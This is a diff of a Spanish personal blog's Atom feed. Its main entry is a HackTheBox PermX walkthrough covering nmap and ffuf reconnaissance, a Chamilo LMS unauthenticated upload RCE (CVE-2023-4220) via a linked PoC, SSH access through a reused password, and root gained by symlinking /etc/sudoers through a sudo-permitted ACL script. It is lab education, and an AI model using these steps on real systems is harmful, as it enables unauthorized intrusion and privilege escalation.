@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-07-25T18:14:19-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">BlogPersonal</title><subtitle>post de proyectos</subtitle><author><name>Eduardo Rivera</name></author><entry><title type="html">Máquina GreenHorn de HackTheBox con dificultad fácil</title><link href="http://localhost:4000/hackthebox/Maquina-GreenHorn/" rel="alternate" type="text/html" title="Máquina GreenHorn de HackTheBox con dificultad fácil" /><published>2024-07-23T00:00:00-06:00</published><updated>2024-07-23T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/Maquina-GreenHorn</id><content type="html" xml:base="http://localhost:4000/hackthebox/Maquina-GreenHorn/"><![CDATA[<h2 id="próximamente">Próximamente…</h2>]]></content><author><name>Eduardo Rivera</name></author><category term="HackTheBox" /><category term="pixelated" /><category term="pluck 4.7.18" /><summary type="html"><![CDATA[La máquina GreenHorn nos muestra las posibilidades de encontrar contraseñas incluso cuando están ocultas en una imagen. Aunque esta máquina en sí misma no representa un gran desafío, el proceso para descubrir la contraseña resulta ser bastante interesante y educativo.]]></summary></entry><entry><title type="html">Instalación, configuración y personalización de ArchLinux.</title><link href="http://localhost:4000/linux/ArchLinux/" rel="alternate" type="text/html" title="Instalación, configuración y personalización de ArchLinux." /><published>2024-07-19T00:00:00-06:00</published><updated>2024-07-19T00:00:00-06:00</updated><id>http://localhost:4000/linux/ArchLinux</id><content type="html" xml:base="http://localhost:4000/linux/ArchLinux/"><![CDATA[<h2 id="arch-linux">Arch Linux</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-07-28T13:52:57-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">BlogPersonal</title><subtitle>post de proyectos</subtitle><author><name>Eduardo Rivera</name></author><entry><title type="html">Máquina GreenHorn de HackTheBox con dificultad fácil</title><link href="http://localhost:4000/hackthebox/Maquina-GreenHorn/" rel="alternate" type="text/html" title="Máquina GreenHorn de HackTheBox con dificultad fácil" /><published>2024-07-23T00:00:00-06:00</published><updated>2024-07-23T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/Maquina-GreenHorn</id><content type="html" xml:base="http://localhost:4000/hackthebox/Maquina-GreenHorn/"><![CDATA[<h2 id="próximamente">Próximamente…</h2>]]></content><author><name>Eduardo Rivera</name></author><category term="HackTheBox" /><category term="pixelated" /><category term="pluck 4.7.18" /><summary type="html"><![CDATA[La máquina GreenHorn nos muestra las posibilidades de encontrar contraseñas incluso cuando están ocultas en una imagen. Aunque esta máquina en sí misma no representa un gran desafío, el proceso para descubrir la contraseña resulta ser bastante interesante y educativo.]]></summary></entry><entry><title type="html">Instalación, configuración y personalización de ArchLinux.</title><link href="http://localhost:4000/linux/ArchLinux/" rel="alternate" type="text/html" title="Instalación, configuración y personalización de ArchLinux." /><published>2024-07-19T00:00:00-06:00</published><updated>2024-07-19T00:00:00-06:00</updated><id>http://localhost:4000/linux/ArchLinux</id><content type="html" xml:base="http://localhost:4000/linux/ArchLinux/"><![CDATA[<h2 id="arch-linux">Arch Linux</h2>
 
 <p style="text-align: justify;">
     <img src="/assets/images/ArchLinux/icons8-arch-linux-480.png" style="float: left; margin: 0 5px 0 0; width: 90px; height: auto;" />
@@ -27,11 +27,15 @@ En este post se abordará la instalación de manera sencilla y la explicación d
 </p>
 
 <h2 id="continuara">Continuara…</h2>]]></content><author><name>Eduardo Rivera</name></author><category term="Linux" /><category term="Linux" /><category term="Personalización" /><summary type="html"><![CDATA[Nos sumergimos en la instalación de Arch Linux, un proceso que puede parecer un gran reto al principio, pero que en realidad es muy sencillo. Además, la personalización del sistema abre un mundo de posibilidades, permitiéndote adaptar cada detalle a tus necesidades y preferencias.]]></summary></entry><entry><title type="html">Máquina PermX de HackTheBox con dificultad fácil</title><link href="http://localhost:4000/hackthebox/permx/" rel="alternate" type="text/html" title="Máquina PermX de HackTheBox con dificultad fácil" /><published>2024-07-12T00:00:00-06:00</published><updated>2024-07-12T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/permx</id><content type="html" xml:base="http://localhost:4000/hackthebox/permx/"><![CDATA[<h3 id="recocimiento">Recocimiento</h3>
-<p>Esta máquina está clasificada como fácil y no puedo decir lo contrario. Lo primero que se hace es un escaneo usando nmap con la siguiente línea de código:</p>
+<p style="text-align: justify;">
+Esta máquina está clasificada como fácil y no puedo decir lo contrario. Lo primero que se hace es un escaneo usando nmap con la siguiente línea de código:
+</p>
 
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">--open</span> <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-oG</span> allPorts 10.10.11.23
 </code></pre></div></div>
-<p>EEl escaneo nos arrojó que están abiertos dos puertos, el 22 y el 80, algo muy común para un servidor que aloja un servicio web. Para ello, vamos a escanear de manera exhaustiva los puertos con el siguiente comando:</p>
+<p style="text-align: justify;">
+EEl escaneo nos arrojó que están abiertos dos puertos, el 22 y el 80, algo muy común para un servidor que aloja un servicio web. Para ello, vamos a escanear de manera exhaustiva los puertos con el siguiente comando: 
+</p>
 
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-oN</span> Ports 10.10.11.23
 </code></pre></div></div>
@@ -68,7 +72,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 <img src="/assets/images/MaquinaPermx/pagina1.png" />
 </p>
 
-<p>Navegando en la página, no encontramos nada en lo cual se pueda comenzar un ataque, así que ahora procedemos a usar la herramienta <code class="language-plaintext highlighter-rouge">ffuf</code> para encontrar posibles páginas ocultas.</p>
+<p style="text-align: justify;">
+Navegando en la página, no encontramos nada en lo cual se pueda comenzar un ataque, así que ahora procedemos a usar la herramienta `ffuf` para encontrar posibles páginas ocultas.
+</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ffuf <span class="nt">-u</span> http://permx.htb/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/big.txt
 
@@ -102,17 +108,21 @@ server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration:
 :: Progress: [20476/20476] :: Job [1/1] :: 162 req/sec :: Duration: [0:01:29] :: Errors: 0 ::
 
 </span></code></pre></div></div>
+<p style="text-align: justify;">
 
-<p>Con el escaneo encontramos diversas páginas:</p>
+Con el escaneo encontramos diversas páginas:
 
 <ul>
-  <li>http://permx.htb/css/</li>
-  <li>http://permx.htb/img/</li>
-  <li>http://permx.htb/js/</li>
-  <li>http://permx.htb/lib/</li>
+  <li><a href="http://permx.htb/css/" target="_blank">http://permx.htb/css/</a></li>
+  <li><a href="http://permx.htb/img/" target="_blank">http://permx.htb/img/</a></li>
+  <li><a href="http://permx.htb/js/" target="_blank">http://permx.htb/js/</a></li>
+  <li><a href="http://permx.htb/lib/" target="_blank">http://permx.htb/lib/</a></li>
 </ul>
 
-<p>Pero hay un problema: en ninguna de estas se encontró nada interesante, así que procedemos a buscar alguna página asociada o subdominio, es decir, host distinto que un usuario tenga que iniciar sesión. Para ello, vamos a usar fuzz de otra manera.</p>
+
+Pero hay un problema, en ninguna de estas se encontró nada interesante, así que procedemos a buscar alguna página asociada o subdominio, es decir, host distinto que un usuario tenga que iniciar sesión. Para ello, vamos a usar fuzz de otra manera.
+
+</p>
 
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">-u</span> http://permx.htb <span class="nt">-H</span> <span class="s2">"Host: FUZZ.permx.htb"</span> <span class="nt">-fc</span> 302
 
@@ -142,20 +152,25 @@ www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Dur
 lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 270ms]
 [WARN] Caught keyboard interrupt (Ctrl-C)
 </span></code></pre></div></div>
-<p>Como podemos ver, encontramos dos subdominios, los cuales son:</p>
+<p style="text-align: justify;">
+
+Como podemos ver, encontramos dos subdominios, los cuales son:
 
 <ul>
-  <li>http://www.permx.htb/</li>
-  <li>http://lms.permx.htb/</li>
+  <li><a href="http://www.permx.htb/" target="_blank">http://www.permx.htb/</a></li>
+  <li><a href="http://lms.permx.htb/" target="_blank">http://lms.permx.htb/</a></li>
 </ul>
 
-<p>De estos subdominios, el que realmente es interesante es el segundo (lms.permx.htb), en este podemos encontrar el panel de inicio de sesión el cual usa Chamilo:</p>
+De estos subdominios, el que realmente es interesante es el segundo (lms.permx.htb), en este podemos encontrar el panel de inicio de sesión el cual usa Chamilo:
+</p>
 
 <p align="center">
 <img src="/assets/images/MaquinaPermx/pagina2.png" />
 </p>
 
-<p>En esta página podemos encontrar un inicio de sesión. Probamos con credenciales típicas como admin - admin, pero no tiene fallas de ese estilo. Así como en la página anterior vimos que tenía páginas ocultas, procedemos a buscar si esta cuenta con páginas ocultas:</p>
+<p style="text-align: justify;">
+En esta página podemos encontrar un inicio de sesión. Probamos con credenciales típicas como admin - admin, pero no tiene fallas de ese estilo. Así como en la página anterior vimos que tenía páginas ocultas, procedemos a buscar si esta cuenta con páginas ocultas:
+</p>
 
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ffuf <span class="nt">-u</span> http://lms.permx.htb/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/big.txt
 
@@ -197,58 +212,63 @@ vendor                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration:
 web                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 161ms]
 :: Progress: [20476/20476] :: Job [1/1] :: 47 req/sec :: Duration: [0:01:38] :: Errors: 0 ::
 </span></code></pre></div></div>
-<p>De la misma manera que en la página anterior, encontramos las siguientes páginas:</p>
+<p style="text-align: justify;">
+
+De la misma manera que en la página anterior, encontramos las siguientes páginas:
 
 <ul>
-  <li>http://lms.permx.htb/LICENSE/</li>
-  <li>http://lms.permx.htb/app/</li>
-  <li>http://lms.permx.htb/bin/</li>
-  <li>http://lms.permx.htb/certificates/</li>
-  <li>http://lms.permx.htb/documentation/</li>
-  <li>http://lms.permx.htb/favicon.ico/</li>
-  <li>http://lms.permx.htb/main/</li>
-  <li>http://lms.permx.htb/plugin/</li>
-  <li>http://lms.permx.htb/robots.txt/</li>
-  <li>http://lms.permx.htb/src/</li>
-  <li>http://lms.permx.htb/vendor/</li>
-  <li>http://lms.permx.htb/web/</li>
+    <li><a href="http://lms.permx.htb/LICENSE/" target="_blank">http://lms.permx.htb/LICENSE/</a></li>
+    <li><a href="http://lms.permx.htb/app/" target="_blank">http://lms.permx.htb/app/</a></li>
+    <li><a href="http://lms.permx.htb/bin/" target="_blank">http://lms.permx.htb/bin/</a></li>
+    <li><a href="http://lms.permx.htb/certificates/" target="_blank">http://lms.permx.htb/certificates/</a></li>
+    <li><a href="http://lms.permx.htb/documentation/" target="_blank">http://lms.permx.htb/documentation/</a></li>
+    <li><a href="http://lms.permx.htb/favicon.ico/" target="_blank">http://lms.permx.htb/favicon.ico/</a></li>
+    <li><a href="http://lms.permx.htb/main/" target="_blank">http://lms.permx.htb/main/</a></li>
+    <li><a href="http://lms.permx.htb/plugin/" target="_blank">http://lms.permx.htb/plugin/</a></li>
+    <li><a href="http://lms.permx.htb/robots.txt/" target="_blank">http://lms.permx.htb/robots.txt/</a></li>
+    <li><a href="http://lms.permx.htb/src/" target="_blank">http://lms.permx.htb/src/</a></li>
+    <li><a href="http://lms.permx.htb/vendor/" target="_blank">http://lms.permx.htb/vendor/</a></li>
+    <li><a href="http://lms.permx.htb/web/" target="_blank">http://lms.permx.htb/web/</a></li>
 </ul>
 
-<p>Si bien encontramos una variedad de enlaces, ninguno de estos es realmente relevante, ya que, a pesar de encontrar información, esta no es de utilidad ni muestra alguna brecha de seguridad aparente. Así que nos queda investigar si la versión de Chamilo que se utilizó en la página web tiene alguna vulnerabilidad. Para ello, podemos verla en el enlace http://lms.permx.htb/documentation/, el cual nos muestra la siguiente información:</p>
+Si bien encontramos una variedad de enlaces, ninguno de estos es realmente relevante, ya que, a pesar de encontrar información, esta no es de utilidad ni muestra alguna brecha de seguridad aparente. Así que nos queda investigar si la versión de Chamilo que se utilizó en la página web tiene alguna vulnerabilidad. Para ello, podemos verla en el enlace 
+        <a href="http://lms.permx.htb/documentation/" target="_blank">http://lms.permx.htb/documentation/</a>, el cual nos muestra la siguiente información:
+    </p>
 
 <p align="center">
 <img src="/assets/images/MaquinaPermx/pagina3.png" />
 </p>
 
-<p>Podemos observar que la versión utilizada es Chamilo 1.11. Después de una investigación, hallamos que sí tiene una vulnerabilidad, la cual se puede encontrar como:</p>
+<p style="text-align: justify;">
+    Podemos observar que la versión utilizada es Chamilo 1.11. Después de una investigación, hallamos que sí tiene una vulnerabilidad, la cual se puede encontrar como:
+</p>
 <ul>
-  <li><a href="https://pentest-tools.com/vulnerabilities-exploits/chamilo-lms-11124-remote-code-execution_22949">CVE-2023-4220</a></li>
+        <li><a href="https://pentest-tools.com/vulnerabilities-exploits/chamilo-lms-11124-remote-code-execution_22949" target="_blank">CVE-2023-4220</a></li>
 </ul>
-
-<p>Esta vulnerabilidad nos dice que:</p>
-
-<ul>
-  <li>
-    <p>Descripción de la vulnerabilidad</p>
-
-    <p>La carga no restringida de archivos en la funcionalidad de carga de archivos grandes en <code class="language-plaintext highlighter-rouge">/main/inc/lib/javascript/bigupload/inc/bigUpload.php</code> en Chamilo LMS &lt;= v1.11.24 permite a atacantes no autenticados realizar ataques de cross-site scripting almacenados y obtener la ejecución remota de código a través de la carga de web shell.</p>
-  </li>
-  <li>
-    <p>Descripción del riesgo</p>
-
-    <p>Existe el riesgo de que un atacante remoto no autenticado pueda comprometer completamente el servidor para robar información confidencial, instalar ransomware o pivotar a la red interna.</p>
-  </li>
-  <li>
-    <p>Recomendación</p>
-
-    <p>Se recomienda actualizar el software afectado a la última versión, que mitiga esta vulnerabilidad.</p>
-  </li>
-</ul>
-
-<p>Referencia: <a href="https://pentest-tools.com/vulnerabilities-exploits/chamilo-lms-11124-remote-code-execution_22949">Chamilo LMS &lt;= 1.11.24 - Remote Code Execution </a></p>
+<p style="text-align: justify;">
+        Esta vulnerabilidad nos dice que:
+</p>
+<ul style="text-align: justify;">
+    <li><strong>Descripción de la vulnerabilidad</strong>
+        <p>La carga no restringida de archivos en la funcionalidad de carga de archivos grandes en <code>/main/inc/lib/javascript/bigupload/inc/bigUpload.php</code> en Chamilo LMS &lt;= v1.11.24 permite a atacantes no autenticados realizar ataques de cross-site scripting almacenados y obtener la ejecución remota de código a través de la carga de web shell.</p>
+        </li>
+    <li><strong>Descripción del riesgo</strong>
+        <p>Existe el riesgo de que un atacante remoto no autenticado pueda comprometer completamente el servidor para robar información confidencial, instalar ransomware o pivotar a la red interna.
+    </p>
+    </li>
+        <li><strong>Recomendación</strong>
+            <p>Se recomienda actualizar el software afectado a la última versión, que mitiga esta vulnerabilidad.</p>
+        </li>
+    </ul>
+<p style="text-align: justify;">
+        Referencia: <a href="https://pentest-tools.com/vulnerabilities-exploits/chamilo-lms-11124-remote-code-execution_22949" target="_blank">Chamilo LMS &lt;= 1.11.24 - Remote Code Execution</a>
+    </p>
 
 <h3 id="explotacion">Explotacion</h3>
-<p>Una vez entendida la vulnerabilidad, procedemos a buscar un exploit o, en su caso, programarlo. Para fines prácticos, se utiliza el siguiente exploit:</p>
+<p style="text-align: justify;">
+Una vez entendida la vulnerabilidad, procedemos a buscar un exploit o, en su caso, programarlo. Para fines prácticos, se utiliza el siguiente exploit:
+    </p>
+
 <ul>
   <li><a href="https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc">Chamilo LMS Unauthenticated Big Upload File RCE PoC</a></li>
 </ul>
@@ -320,7 +340,10 @@ www-data@permx:/var/www/chamilo/app/config<span class="nv">$ </span><span class=
 <span class="c1">// Enable access to database management for platform admins.</span>
 <span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'db_manager_enabled'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
 </code></pre></div></div>
-<p>En este caso, podemos encontrar una contraseña. Esta contraseña, en primeras instancias, es para iniciar sesión en la base de datos, pero podemos probar si esta contraseña funciona para conectarnos al usuario encontrado. Este usuario lo encontramos al acceder a la carpeta /home/. Ahí podemos ver ese usuario, así que procederemos a intentar iniciar sesión por SSH.</p>
+<p style="text-align: justify;">
+
+En este caso, podemos encontrar una contraseña. Esta contraseña, en primeras instancias, es para iniciar sesión en la base de datos, pero podemos probar si esta contraseña funciona para conectarnos al usuario encontrado. Este usuario lo encontramos al acceder a la carpeta /home/. Ahí podemos ver ese usuario, así que procederemos a intentar iniciar sesión por SSH.
+</p>
 
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload<span class="nv">$ </span><span class="nb">cd</span> /home
 <span class="nb">cd</span> /home
@@ -380,54 +403,63 @@ mtz@permx:~<span class="nv">$ </span><span class="nb">cat</span> /opt/acl.sh
 <p>1- Crear un enlace simbólico:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ln</span> <span class="nt">-s</span> /etc/sudoers symlink
 </code></pre></div></div>
-<ul>
-  <li><strong>ln</strong>: Comando para crear enlaces.</li>
-  <li><strong>-s</strong>: Indica que se creará un enlace simbólico (o “symlink”).</li>
-  <li><strong>/etc/sudoers</strong>: Archivo original al que se creará el enlace.</li>
-  <li><strong>symlink</strong>*: Nombre del nuevo enlace simbólico.
-Este comando crea un enlace simbólico llamado symlink que apunta al archivo /etc/sudoers. Los enlaces simbólicos son como atajos que apuntan a otro archivo o directorio.</li>
+<ul style="text-align: justify;">
+    <li><strong>ln</strong>: Comando para crear enlaces.</li>
+    <li><strong>-s</strong>: Indica que se creará un enlace simbólico (o "symlink").</li>
+    <li><strong>/etc/sudoers</strong>: Archivo original al que se creará el enlace.</li>
+    <li><strong>symlink</strong>: Nombre del nuevo enlace simbólico.</li>
 </ul>
+<p style="text-align: justify;">
+    Este comando crea un enlace simbólico llamado symlink que apunta al archivo /etc/sudoers. Los enlaces simbólicos son como atajos que apuntan a otro archivo o directorio.
+</p>
 
 <p>2- Listar archivos con detalles:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-l</span>
 </code></pre></div></div>
-<ul>
-  <li><strong>ls</strong>: Comando para listar archivos y directorios.</li>
-  <li><strong>-l</strong>: Muestra una lista detallada de archivos con permisos, número de enlaces, propietario, grupo, tamaño, fecha de modificación y nombre del archivo.
-Este comando mostrará una lista de archivos en el directorio actual, incluida información detallada sobre cada archivo. Entre ellos, se mostrará el enlace simbólico symlink.</li>
+<ul style="text-align: justify;">
+    <li><strong>ls</strong>: Comando para listar archivos y directorios.<br />
+        <p>Este comando mostrará una lista de archivos en el directorio actual, incluida información detallada sobre cada archivo. Entre ellos, se mostrará el enlace simbólico symlink.</p>
+    </li>
+    <li><strong>-l</strong>: Muestra una lista detallada de archivos con permisos, número de enlaces, propietario, grupo, tamaño, fecha de modificación y nombre del archivo.</li>
 </ul>
 
 <p>3- Ejecutar un script con privilegios:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /opt/act.sh mtz rwx /home/mtz/symlink
 </code></pre></div></div>
-<ul>
-  <li><strong>sudo</strong>: Ejecuta un comando con privilegios de superusuario (root).</li>
-  <li><strong>/opt/act.sh</strong>: Ruta al script que se va a ejecutar.</li>
-  <li><strong>mtz rwx /home/mtz/symlink</strong>: Argumentos pasados al script.
-Este comando ejecuta el script /opt/act.sh con privilegios elevados, pasando los argumentos mtz, rwx y /home/mtz/symlink. La naturaleza de estos argumentos y el propósito del script dependerá de su contenido.</li>
+<ul style="text-align: justify;">
+    <li><strong>sudo</strong>: Ejecuta un comando con privilegios de superusuario (root).</li>
+    <li><strong>/opt/act.sh</strong>: Ruta al script que se va a ejecutar.</li>
+    <li><strong>mtz rwx /home/mtz/symlink</strong>: Argumentos pasados al script.</li>
 </ul>
+<p style="text-align: justify;">
+    Este comando ejecuta el script /opt/act.sh con privilegios elevados, pasando los argumentos mtz, rwx y /home/mtz/symlink. La naturaleza de estos argumentos y el propósito del script dependerá de su contenido.
+</p>
 
 <p>4- Editar un archivo con nano:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano /home/mtz/symlink
 </code></pre></div></div>
-<ul>
-  <li><strong>nano</strong>: Editor de texto en la línea de comandos.</li>
-  <li><strong>/home/mtz/symlink</strong>: Archivo que se va a editar.
-Este comando abre el archivo /home/mtz/symlink en el editor de texto nano. Como symlink es un enlace simbólico que apunta a /etc/sudoers, estarás editando el archivo real /etc/sudoers.</li>
+<ul style="text-align: justify;">
+    <li><strong>nano</strong>: Editor de texto en la línea de comandos.</li>
+    <li><strong>/home/mtz/symlink</strong>: Archivo que se va a editar.</li>
 </ul>
+<p style="text-align: justify;">
+    Este comando abre el archivo /home/mtz/symlink en el editor de texto nano. Como symlink es un enlace simbólico que apunta a /etc/sudoers, estarás editando el archivo real /etc/sudoers.
+</p>
 <p align="center">
-<img src="/assets/images/MaquinaPermx/pagina6.png" />
+    <img src="/assets/images/MaquinaPermx/pagina6.png" alt="Ejemplo de imagen" />
 </p>
 
 <p>5- Cambiar a superusuario:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
 </code></pre></div></div>
 
-<ul>
-  <li><strong>sudo</strong>: Ejecuta un comando con privilegios de superusuario (root).</li>
-  <li><strong>su</strong>: Cambia de usuario.
-Este comando te cambia al usuario root, dándote acceso completo a todo el sistema</li>
-</ul>]]></content><author><name>Eduardo Rivera</name></author><category term="HackTheBox" /><category term="puerto 80" /><category term="nmap" /><summary type="html"><![CDATA[En esta máquina se abordaron conceptos sencillos pero interesantes. Nos muestra los riesgos asociados al uso de la misma contraseña en múltiples servicios, y nos hace tomar conciencia de lo vulnerables que podemos estar.]]></summary></entry><entry><title type="html">Personalización de un entorno de trabajo Linux.</title><link href="http://localhost:4000/linux/Personalizacion/" rel="alternate" type="text/html" title="Personalización de un entorno de trabajo Linux." /><published>2024-07-09T00:00:00-06:00</published><updated>2024-07-09T00:00:00-06:00</updated><id>http://localhost:4000/linux/Personalizacion</id><content type="html" xml:base="http://localhost:4000/linux/Personalizacion/"><![CDATA[<h1 id="personalización-de-linux">Personalización de Linux</h1>
+<ul style="text-align: justify;">
+    <li><strong>sudo</strong>: Ejecuta un comando con privilegios de superusuario (root).</li>
+    <li><strong>su</strong>: Cambia de usuario.</li>
+</ul>
+<p style="text-align: justify;">
+    Este comando te cambia al usuario root, dándote acceso completo a todo el sistema.
+</p>]]></content><author><name>Eduardo Rivera</name></author><category term="HackTheBox" /><category term="puerto 80" /><category term="nmap" /><summary type="html"><![CDATA[En esta máquina se abordaron conceptos sencillos pero interesantes. Nos muestra los riesgos asociados al uso de la misma contraseña en múltiples servicios, y nos hace tomar conciencia de lo vulnerables que podemos estar.]]></summary></entry><entry><title type="html">Personalización de un entorno de trabajo Linux.</title><link href="http://localhost:4000/linux/Personalizacion/" rel="alternate" type="text/html" title="Personalización de un entorno de trabajo Linux." /><published>2024-07-09T00:00:00-06:00</published><updated>2024-07-09T00:00:00-06:00</updated><id>http://localhost:4000/linux/Personalizacion</id><content type="html" xml:base="http://localhost:4000/linux/Personalizacion/"><![CDATA[<h1 id="personalización-de-linux">Personalización de Linux</h1>
 <p>Instalación de  <a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Installing-ZSH">ZSH</a> para eso vamos a usar el siguiente comando:</p>
 
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>zsh
